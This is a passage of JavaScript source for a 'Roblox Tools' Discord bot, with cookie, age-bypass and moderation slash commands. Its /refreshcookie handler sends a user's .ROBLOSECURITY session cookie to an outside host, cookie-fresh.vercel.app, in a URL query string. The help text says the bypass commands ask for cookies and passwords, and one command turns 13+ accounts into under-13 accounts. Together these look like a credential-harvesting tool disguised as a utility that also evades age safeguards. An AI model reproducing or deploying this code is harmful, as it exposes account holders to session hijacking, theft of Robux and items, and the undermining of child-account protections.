          { name: "Bypass Result", value: data.message || (data.status === "success" ? "Success converting 13+ to under 13!" : "Unknown error"), inline: false },
          { name: "Status", value: data.status === "success" ? "<:yes:1393890949960306719> Completed" : "<:no:1393890945929318542> Failed", inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag} • Roblox Tools`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    } catch (error) {
      console.error('Bypass13plus error:', error);
      
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle("Age Bypass (13+ to Under 13)")
        .setDescription("Bypass request failed")
        .addFields(
          { name: "Bypass Result", value: `<:no:1393890945929318542> **API Error:** ${error.message}`, inline: false },
          { name: "Status", value: "<:no:1393890945929318542> API Unavailable", inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag} • Roblox Tools`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'refreshcookie') {
    let cookie = interaction.options.getString('cookie');

    // Handle both formats: with and without warning prefix
    const warningPrefix = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
    
    // Strip the warning prefix if it exists
    if (cookie.startsWith(warningPrefix)) {
      cookie = cookie.substring(warningPrefix.length);
    }

    await interaction.reply({ content: '<:Refresh:1393888531973406881> Refreshing your cookie...', ephemeral: true });

    try {
      const res = await fetch(`https://cookie-fresh.vercel.app/api/refresh?cookie=${encodeURIComponent(cookie)}`);
      const data = await res.json();

      if (!data.redemptionResult || !data.redemptionResult.success) {
        const errorEmbed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle("<:no:1393890945929318542> Unable to refresh your cookie.")
          .setDescription("Roblox might have rejected the cookie or the backend failed.")
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });
        return interaction.followUp({ embeds: [errorEmbed] });
      }

      const refreshed = data.redemptionResult.refreshedCookie;

      // Get Roblox user data for the public embed
      const robloxData = await getRobloxUserData(cookie);

      const publicEmbed = new EmbedBuilder()
        .setColor(0x00d4ff)
        .setTitle(robloxData ? `${robloxData.username}` : "<:yes:1393890949960306719> Cookie Refreshed Successfully!")
          .setDescription("<:Refresh:1393888531973406881> **Cookie Refresh Service**")
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag} • Roblox Tools`,
          iconURL: interaction.user.displayAvatarURL()
        });

      // Add Roblox user info if available
      if (robloxData) {
        if (robloxData.avatar) {
          publicEmbed.setThumbnail(robloxData.avatar);
        }

        publicEmbed.addFields(
          { name: "<:Robux:1393888802128265348> Robux Balance", value: `\`${robloxData.robux}\``, inline: true },
          { name: "<:DominusEmpyreus:1393888539263107113> RAP Value", value: `\`${robloxData.rap}\``, inline: true },
          { name: "<:member_IDS:1393888535412740096> User ID", value: `\`${robloxData.userId}\``, inline: true }
        );
      }

      // Add refresh result at bottom
      publicEmbed.addFields(
        { name: "<:Refresh:1393888531973406881> Refresh Result", value: "Your new cookie has been generated and sent privately.", inline: false },
        { name: "Status", value: "<:yes:1393890949960306719> Completed", inline: true }
      );

      await interaction.followUp({ embeds: [publicEmbed] }); // public message

      const privateEmbed = new EmbedBuilder()
        .setColor(0x0ea5e9)
        .setTitle("Your New .ROBLOSECURITY Cookie")
        .setDescription(`\`\`\`${refreshed}\`\`\``)
        .addFields(
          { name: "Security Notice", value: "Keep this cookie private and secure!", inline: false }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({
        embeds: [privateEmbed],
        ephemeral: true // only the user sees this
      });

    } catch (err) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle("<:no:1393890945929318542> Request Failed")
        .setDescription("Failed to connect to refresh API or bad response.")
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });
      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'help') {
    commandStats.help++;

    const helpEmbed = new EmbedBuilder()
      .setColor(0x0ea5e9)
      .setTitle('Roblox Tools Bot - Help')
      .setDescription('Here are all available commands and their descriptions:')
      .addFields(
        { 
          name: '/bypass2008', 
          value: 'Remove the verified email address\n**Usage:** Provide your .ROBLOSECURITY cookie', 
          inline: false 
        },
        { 
          name: '/bypass13plus', 
          value: 'Convert 13+ account to under 13 account\n**Usage:** Provide cookie and password', 
          inline: false 
        },
        { 
          name: '<:Refresh:1393888531973406881> /refreshcookie', 
          value: 'Refresh your .ROBLOSECURITY cookie\n**Usage:** Provide your current cookie', 
          inline: false 
        },
        { 
          name: '/botstats', 
          value: 'Show bot statistics and uptime', 
          inline: false 
        },
        { 
          name: '/help', 
          value: 'Show this help message', 
          inline: false 
        },
        { 
          name: '/validatecookie', 
          value: 'Check if a .ROBLOSECURITY cookie is valid', 
          inline: false 
        },
        { 
          name: '/cookieexpiry', 
          value: 'Check if your cookie might expire soon', 
          inline: false 
        },
        { 
          name: '<:member_IDS:1393888535412740096> /profilelookup', 
          value: 'Get Roblox user info from username or ID', 
          inline: false 
        },
        { 
          name: '/ban', 
          value: 'Ban a user from the server (Requires Ban Members permission)', 
          inline: false 
        },
        { 
          name: '/kick', 
          value: 'Kick a user from the server (Requires Kick Members permission)', 
          inline: false 
        },
        { 
          name: '/mute', 
          value: 'Timeout/mute a user for specified minutes (Requires Moderate Members permission)', 
          inline: false 
        },
        { 
          name: '/unmute', 
          value: 'Remove timeout/unmute a user (Requires Moderate Members permission)', 
          inline: false 
        },
        { 
          name: '/warn', 
          value: 'Send a warning to a user (Requires Moderate Members permission)', 
          inline: false 
        },
        { 
          name: '/embedcreate', 
          value: 'Create a custom embed message with title, description, colors, images, and clickable buttons\n**Button formats:** "Label,URL" or "<:emoji:id> Label,URL" or "<a:emoji:id> Label,URL" (max 5 buttons)', 
          inline: false 
        },
        { 
          name: '/embedupdate', 
          value: 'Update an existing embed using its ID (Owner/Admin only)\n**Usage:** Provide embed ID and new values for fields you want to change', 
          inline: false 
        },
        { 
          name: 'Important Notes:', 
          value: '• Commands have a 5-second cooldown\n• Only works in designated channel\n• Keep your cookies private!\n• Moderation commands require proper permissions', 
          inline: false 
        }
      )
      .setThumbnail(client.user.displayAvatarURL())
      .setTimestamp()
      .setFooter({
        text: `Requested by ${interaction.user.tag}`,
        iconURL: interaction.user.displayAvatarURL()
      });

    await interaction.reply({ embeds: [helpEmbed] });
  }

  if (interaction.commandName === 'botstats') {
    commandStats.botstats++;

    const uptime = process.uptime();
    const uptimeHours = Math.floor(uptime / 3600);
    const uptimeMinutes = Math.floor((uptime % 3600) / 60);
    const uptimeSeconds = Math.floor(uptime % 60);

    const totalCommands = Object.values(commandStats).reduce((a, b) => a + b, 0);

    const statsEmbed = new EmbedBuilder()
      .setColor(0x22c55e)
      .setTitle('Bot Statistics')
      .setDescription('Current bot performance and usage stats')
      .addFields(
        { 
          name: 'Uptime', 
          value: `${uptimeHours}h ${uptimeMinutes}m ${uptimeSeconds}s`, 
          inline: true 
        },
        { 
          name: 'Ping', 
          value: `${client.ws.ping}ms`, 
          inline: true 
        },
        { 
          name: 'Total Commands Used', 
          value: `${totalCommands}`, 
          inline: true 
        },
        { 
          name: 'Bypass2008 Used', 
          value: `${commandStats.bypass2008} times`, 
          inline: true 
        },
        { 
          name: 'Bypass13plus Used', 
          value: `${commandStats.bypass13plus} times`, 
          inline: true 
        },
        { 
          name: '<:Refresh:1393888531973406881> RefreshCookie Used', 
          value: `${commandStats.refreshcookie} times`, 
          inline: true 
        },
        { 
          name: 'ValidateCookie Used', 
          value: `${commandStats.validatecookie} times`, 
          inline: true 
        },
        { 
          name: 'CookieExpiry Used', 
          value: `${commandStats.cookieexpiry} times`, 
          inline: true 
        },
        { 
          name: '<:member_IDS:1393888535412740096> ProfileLookup Used', 
          value: `${commandStats.profilelookup} times`, 
          inline: true 
        },
        { 
          name: 'Ban Used', 
          value: `${commandStats.ban} times`, 
          inline: true 
        },
        { 
          name: 'Kick Used', 
          value: `${commandStats.kick} times`, 
          inline: true 
        },
        { 
          name: 'Mute Used', 
          value: `${commandStats.mute} times`, 
          inline: true 
        },
        { 
          name: 'Unmute Used', 
          value: `${commandStats.unmute} times`, 
          inline: true 
        },
        { 
          name: 'Warn Used', 
          value: `${commandStats.warn} times`, 
          inline: true 
        },
        { 
          name: 'Bot Info', 
          value: `Servers: ${client.guilds.cache.size}\nUsers: ${client.users.cache.size}`, 
          inline: false 
        }
      )
      .setThumbnail(client.user.displayAvatarURL())
      .setTimestamp()
      .setFooter({
        text: `Requested by ${interaction.user.tag}`,
        iconURL: interaction.user.displayAvatarURL()
      });

    await interaction.reply({ embeds: [statsEmbed] });
  }

  if (interaction.commandName === 'validatecookie') {
    const cookie = interaction.options.getString('cookie');
    commandStats.validatecookie++;

    await interaction.reply({ content: '🔍 Validating cookie...', ephemeral: true });

    try {
      const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookie}`,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (res.status === 200) {
        const userData = await res.json();

        // Get detailed Roblox user data
        const robloxData = await getRobloxUserData(cookie);

        const embed = new EmbedBuilder()
          .setColor(0x00ff88)
          .setTitle(robloxData ? `${robloxData.username}` : '<:yes:1393890949960306719> Cookie Valid!')
          .setDescription(`**Cookie Validation Complete**\nAuthenticated for user: **${userData.name}**`)
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag} • Roblox Tools`,
            iconURL: interaction.user.displayAvatarURL()
          });

        // Add Roblox user info if available
        if (robloxData) {
          if (robloxData.avatar) {
            embed.setThumbnail(robloxData.avatar);
          }

          embed.addFields(
            { name: "<:Robux:1393888802128265348> Robux Balance", value: `\`${robloxData.robux}\``, inline: true },
            { name: "<:DominusEmpyreus:1393888539263107113> RAP Value", value: `\`${robloxData.rap}\``, inline: true },
            { name: "<:member_IDS:1393888535412740096> User ID", value: `\`${robloxData.userId}\``, inline: true }
          );
        } else {
          embed.addFields(
            { name: '<:member_IDS:1393888535412740096> User ID', value: `\`${userData.id}\``, inline: true },
            { name: ' Display Name', value: `\`${userData.displayName}\``, inline: true },
            { name: '<:yes:1393890949960306719> Status', value: '`Active`', inline: true }
          );
        }

        await interaction.followUp({ embeds: [embed] });
      } else {
        const embed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle('<:no:1393890945929318542> Cookie Invalid')
          .setDescription('The provided cookie is invalid or expired.')
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.followUp({ embeds: [embed] });
      }
    } catch (error) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('<:no:1393890945929318542> Validation Failed')
        .setDescription('Unable to validate cookie due to network error.')
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'cookieexpiry') {
    const cookie = interaction.options.getString('cookie');
    commandStats.cookieexpiry++;

    await interaction.reply({ content: 'Checking cookie expiry...', ephemeral: true });

    try {
      const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookie}`,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (res.status === 200) {
        // Get detailed Roblox user data
        const robloxData = await getRobloxUserData(cookie);

        // Check if cookie is close to expiry by testing multiple requests
        const testCount = 3;
        let successCount = 0;

        for (let i = 0; i < testCount; i++) {
          try {
            const testRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
              headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
              }
            });
            if (testRes.status === 200) successCount++;
          } catch {}
          await new Promise(resolve => setTimeout(resolve, 500));
        }

        const reliability = (successCount / testCount) * 100;
        let status, color, message;

        if (reliability >= 90) {
          status = '<:yes:1393890949960306719> Healthy';
          color = 0x22c55e;
          message = 'Cookie is stable and not expected to expire soon.';
        } else if (reliability >= 70) {
          status = 'Warning';
          color = 0xfacc15;
          message = 'Cookie may be unstable. Consider refreshing soon.';
        } else {
          status = '<:no:1393890945929318542> Critical';
          color = 0xef4444;
          message = 'Cookie is unreliable and may expire soon. Refresh immediately!';
        }

        const embed = new EmbedBuilder()
          .setColor(color)
          .setTitle(robloxData ? `${robloxData.username}` : 'Cookie Expiry Check')
          .setDescription(`**Cookie Health Monitor**\n${message}`)
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag} • Roblox Tools`,
            iconURL: interaction.user.displayAvatarURL()
          });

        // Add Roblox user info if available
        if (robloxData) {
          if (robloxData.avatar) {
            embed.setThumbnail(robloxData.avatar);
          }

          embed.addFields(
            { name: "<:Robux:1393888802128265348> Robux Balance", value: `\`${robloxData.robux}\``, inline: true },
            { name: "<:DominusEmpyreus:1393888539263107113> RAP Value", value: `\`${robloxData.rap}\``, inline: true },
            { name: "<:member_IDS:1393888535412740096> User ID", value: `\`${robloxData.userId}\``, inline: true }
          );
        }

        // Add expiry check results
        embed.addFields(
          { name: 'Status', value: status, inline: true },
          { name: 'Reliability', value: `${reliability.toFixed(1)}%`, inline: true },
          { name: 'Recommendation', value: reliability >= 90 ? 'No action needed' : 'Consider refreshing', inline: true }
        );

        await interaction.followUp({ embeds: [embed] });
      } else {
        const embed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle('<:no:1393890945929318542> Cookie Expired')
          .setDescription('The cookie is already invalid or expired.')
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.followUp({ embeds: [embed] });
      }
    } catch (error) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('<:no:1393890945929318542> Check Failed')
        .setDescription('Unable to check cookie expiry due to network error.')
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'profilelookup') {
    const identifier = interaction.options.getString('identifier');
    commandStats.profilelookup++;

    await interaction.reply({ content: 'Looking up profile...', ephemeral: true });

    try {
      let userId;

      // Check if identifier is a number (user ID) or username
      if (/^\d+$/.test(identifier)) {
        userId = identifier;
      } else {
        // Get user ID from username
        const userRes = await fetch(`https://users.roblox.com/v1/usernames/users`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            usernames: [identifier]
          })
        });

        const userData = await userRes.json();
        if (!userData.data || userData.data.length === 0) {
          const embed = new EmbedBuilder()
            .setColor(0xef4444)
            .setTitle('<:no:1393890945929318542> User Not Found')
            .setDescription('No user found with that username.')
            .setTimestamp()
            .setFooter({
              text: `Requested by ${interaction.user.tag}`,
              iconURL: interaction.user.displayAvatarURL()
            });

          return interaction.followUp({ embeds: [embed] });
        }
        userId = userData.data[0].id;
      }

      // Get detailed user info
      const [userRes, avatarRes] = await Promise.all([
        fetch(`https://users.roblox.com/v1/users/${userId}`),
        fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`)
      ]);

      const userInfo = await userRes.json();
      const avatarInfo = await avatarRes.json();

      if (userRes.status !== 200) {
        const embed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle('<:no:1393890945929318542> User Not Found')
          .setDescription('No user found with that ID.')
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        return interaction.followUp({ embeds: [embed] });
      }

      const embed = new EmbedBuilder()
        .setColor(0x0ea5e9)
        .setTitle(`${userInfo.displayName} (@${userInfo.name})`)
        .setDescription(userInfo.description || 'No description available')
        .addFields(
          { name: '<:member_IDS:1393888535412740096> User ID', value: `${userInfo.id}`, inline: true },
          { name: 'Username', value: `@${userInfo.name}`, inline: true },
          { name: 'Display Name', value: userInfo.displayName, inline: true },
          { name: 'Created', value: new Date(userInfo.created).toLocaleDateString(), inline: true },
          { name: 'Banned', value: userInfo.isBanned ? '<:no:1393890945929318542> Yes' : '<:yes:1393890949960306719> No', inline: true },
          { name: 'Profile Link', value: `[View Profile](https://www.roblox.com/users/${userInfo.id}/profile)`, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      // Add avatar if available
      if (avatarInfo.data && avatarInfo.data.length > 0) {
        embed.setThumbnail(avatarInfo.data[0].imageUrl);
      }

      await interaction.followUp({ embeds: [embed] });
    } catch (error) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('<:no:1393890945929318542> Lookup Failed')
        .setDescription('Unable to lookup profile due to network error.')
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    }
  }

  // Moderation Commands
  if (interaction.commandName === 'ban') {
    const targetUser = interaction.options.getUser('user');
    const reason = interaction.options.getString('reason') || 'No reason provided';
    commandStats.ban++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    // Check if bot has permission
    if (!interaction.guild.members.me.permissions.has(PermissionFlagsBits.BanMembers)) {
      return interaction.reply({
        content: '<:no:1393890945929318542> I don\'t have permission to ban members.',
        ephemeral: true
      });
    }

    try {
      const member = await interaction.guild.members.fetch(targetUser.id);

      // Check if user is trying to ban themselves
      if (targetUser.id === interaction.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot ban yourself.',
          ephemeral: true
        });
      }

      // Check if user is trying to ban the bot
      if (targetUser.id === client.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> I cannot ban myself.',
          ephemeral: true
        });
      }

      // Check role hierarchy
      if (member.roles.highest.position >= interaction.member.roles.highest.position) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot ban someone with a higher or equal role.',
          ephemeral: true
        });
      }

      await member.ban({ reason });

      const embed = new EmbedBuilder()
        .setColor(0xef4444)
        .setTitle('User Banned')
        .setDescription(`**${targetUser.tag}** has been banned from the server.`)
        .addFields(
          { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
          { name: 'Reason', value: reason, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `User ID: ${targetUser.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      const reply = await interaction.reply({ embeds: [embed] });

      // Auto-delete after 5 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting ban message:', error);
        }
      }, 5000);
    } catch (error) {
      console.error('Ban error:', error);
      await interaction.reply({
        content: '<:no:1393890945929318542> Failed to ban user. They may not be in the server or I lack permissions.',
        ephemeral: true
      });
    }
  }

  if (interaction.commandName === 'kick') {
    const targetUser = interaction.options.getUser('user');
    const reason = interaction.options.getString('reason') || 'No reason provided';
    commandStats.kick++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    // Check if bot has permission
    if (!interaction.guild.members.me.permissions.has(PermissionFlagsBits.KickMembers)) {
      return interaction.reply({
        content: '<:no:1393890945929318542> I don\'t have permission to kick members.',
        ephemeral: true
      });
    }

    try {
      const member = await interaction.guild.members.fetch(targetUser.id);

      // Check if user is trying to kick themselves
      if (targetUser.id === interaction.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot kick yourself.',
          ephemeral: true
        });
      }

      // Check if user is trying to kick the bot
      if (targetUser.id === client.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> I cannot kick myself.',
          ephemeral: true
        });
      }

      // Check role hierarchy
      if (member.roles.highest.position >= interaction.member.roles.highest.position) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot kick someone with a higher or equal role.',
          ephemeral: true
        });
      }

      await member.kick(reason);

      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('User Kicked')
        .setDescription(`**${targetUser.tag}** has been kicked from the server.`)
        .addFields(
          { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
          { name: 'Reason', value: reason, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `User ID: ${targetUser.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      const reply = await interaction.reply({ embeds: [embed] });

      // Auto-delete after 5 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting kick message:', error);
        }
      }, 5000);
    } catch (error) {
      console.error('Kick error:', error);
      await interaction.reply({
        content: '<:no:1393890945929318542> Failed to kick user. They may not be in the server or I lack permissions.',
        ephemeral: true
      });
    }
  }

  if (interaction.commandName === 'mute') {
    const targetUser = interaction.options.getUser('user');
    const duration = interaction.options.getInteger('duration');
    const reason = interaction.options.getString('reason') || 'No reason provided';
    commandStats.mute++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    // Check if bot has permission
    if (!interaction.guild.members.me.permissions.has(PermissionFlagsBits.ModerateMembers)) {
      return interaction.reply({
        content: '<:no:1393890945929318542> I don\'t have permission to timeout members.',
        ephemeral: true
      });
    }

    try {
      const member = await interaction.guild.members.fetch(targetUser.id);

      // Check if user is trying to mute themselves
      if (targetUser.id === interaction.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot mute yourself.',
        });
      }

      // Check if user is trying to mute the bot
      if (targetUser.id === client.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> I cannot mute myself.',
        });
      }

      // Check role hierarchy
      if (member.roles.highest.position >= interaction.member.roles.highest.position) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot mute someone with a higher or equal role.',
          ephemeral: true
        });
      }

      const timeoutDuration = duration * 60 * 1000; // Convert minutes to milliseconds
      await member.timeout(timeoutDuration, reason);

      const embed = new EmbedBuilder()
        .setColor(0xff6b6b)
        .setTitle('User Muted')
        .setDescription(`**${targetUser.tag}** has been muted for ${duration} minutes.`)
        .addFields(
          { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
          { name: 'Duration', value: `${duration} minutes`, inline: true },
          { name: 'Reason', value: reason, inline: false }
        )
        .setTimestamp()
        .setFooter({
          text: `User ID: ${targetUser.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      const reply = await interaction.reply({ embeds: [embed] });

      // Auto-delete after 5 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting mute message:', error);
        }
      }, 5000);
    } catch (error) {
      console.error('Mute error:', error);
      await interaction.reply({
        content: '<:no:1393890945929318542> Failed to mute user. They may not be in the server or I lack permissions.',
        ephemeral: true
      });
    }
  }

  if (interaction.commandName === 'unmute') {
    const targetUser = interaction.options.getUser('user');
    const reason = interaction.options.getString('reason') || 'No reason provided';
    commandStats.unmute++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    // Check if bot has permission
    if (!interaction.guild.members.me.permissions.has(PermissionFlagsBits.ModerateMembers)) {
      return interaction.reply({
        content: '<:no:1393890945929318542> I don\'t have permission to remove timeouts.',
        ephemeral: true
      });
    }

    try {
      const member = await interaction.guild.members.fetch(targetUser.id);

      if (!member.isCommunicationDisabled()) {
        return interaction.reply({
          content: '<:no:1393890945929318542> This user is not currently muted.',
          ephemeral: true
        });
      }

      await member.timeout(null, reason);

      const embed = new EmbedBuilder()
        .setColor(0x4caf50)
        .setTitle('User Unmuted')
        .setDescription(`**${targetUser.tag}** has been unmuted.`)
        .addFields(
          { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
          { name: 'Reason', value: reason, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `User ID: ${targetUser.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      const reply = await interaction.reply({ embeds: [embed] });

      // Auto-delete after 5 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting unmute message:', error);
        }
      }, 5000);
    } catch (error) {
      console.error('Unmute error:', error);
      await interaction.reply({
        content: '<:no:1393890945929318542> Failed to unmute user. They may not be in the server or I lack permissions.',
        ephemeral: true
      });
    }
  }

  if (interaction.commandName === 'warn') {
    const targetUser = interaction.options.getUser('user');
    const reason = interaction.options.getString('reason');
    commandStats.warn++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    try {
      const member = await interaction.guild.members.fetch(targetUser.id);

      // Check if user is trying to warn themselves
      if (targetUser.id === interaction.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot warn yourself.',
        });
      }

      // Check if user is trying to warn the bot
      if (targetUser.id === client.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot warn me.',
        });
      }

      // Send DM to the warned user
      try {
        const dmEmbed = new EmbedBuilder()
          .setColor(0xfacc15)
          .setTitle('Warning Received')
          .setDescription(`You have received a warning in **${interaction.guild.name}**.`)
          .addFields(
            { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
            { name: 'Reason', value: reason, inline: false }
          )
          .setTimestamp();

        await targetUser.send({ embeds: [dmEmbed] });
      } catch (dmError) {
        console.log('Could not send DM to user');
      }

      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('User Warned')
        .setDescription(`**${targetUser.tag}** has been warned.`)
        .addFields(
          { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
          { name: 'Reason', value: reason, inline: false }
        )
        .setTimestamp()
        .setFooter({
          text: `User ID: ${targetUser.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      const reply = await interaction.reply({ embeds: [embed] });

      // Auto-delete after 5 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting warn message:', error);
        }
      }, 5000);
    } catch (error) {
      console.error('Warn error:', error);
      await interaction.reply({
        content: '<:no:1393890945929318542> Failed to warn user. They may not be in the server.',
        ephemeral: true
      });
    }
  }

  if (interaction.commandName === 'commandassign') {
    const mode = interaction.options.getString('mode');
    const targetChannel = interaction.options.getChannel('channel');
    const commandName = interaction.options.getString('command');
    commandStats.commandassign++;

    // Double-check permissions (already checked above, but good practice)
    const isOwnerOrBotOwner = interaction.guild.ownerId === interaction.user.id || isBotOwner(interaction.user.id);
    
    if (!isOwnerOrBotOwner) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only bot owners and server owners can use this command.',
        ephemeral: true
      });
    }

    if (mode === 'auto') {
      // Auto mode - display all text channels
      const textChannels = interaction.guild.channels.cache
        .filter(channel => channel.type === 0) // Only text channels
        .sort((a, b) => a.position - b.position)
        .map(channel => channel);

      if (textChannels.length === 0) {
        return interaction.reply({
          content: '<:no:1393890945929318542> No text channels found in this server.',
          ephemeral: true
        });
      }

      // Get current assignments for this guild
      const guildAssignments = commandChannelAssignments.get(interaction.guild.id) || {};
      const currentAssignments = guildAssignments[commandName] || [];

      let assignmentText = 'None (usable anywhere)';
      if (currentAssignments.length > 0) {
        assignmentText = currentAssignments.map(id => `<#${id}>`).join(', ');
      }

      const embed = new EmbedBuilder()
        .setColor(0x00d4ff)
        .setTitle(`Available Channels for /${commandName}`)
        .setDescription(`Select any channel below to assign **/${commandName}** to it.\nCurrently assigned to: ${assignmentText}`)
        .setTimestamp()
        .setFooter({
          text: `Guild ID: ${interaction.guild.id} • Total channels: ${textChannels.length}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      // Split channels into chunks to avoid field limit
      const channelsPerField = 10;
      const channelChunks = [];
      for (let i = 0; i < textChannels.length; i += channelsPerField) {
        channelChunks.push(textChannels.slice(i, i + channelsPerField));
      }

      channelChunks.forEach((chunk, index) => {
        const channelList = chunk.map(channel => {
          const isAssigned = currentAssignments.includes(channel.id);
          return `${isAssigned ? '🎯 ' : '📺 '}<#${channel.id}> ${isAssigned ? '(Currently assigned)' : ''}`;
        }).join('\n');

        embed.addFields({
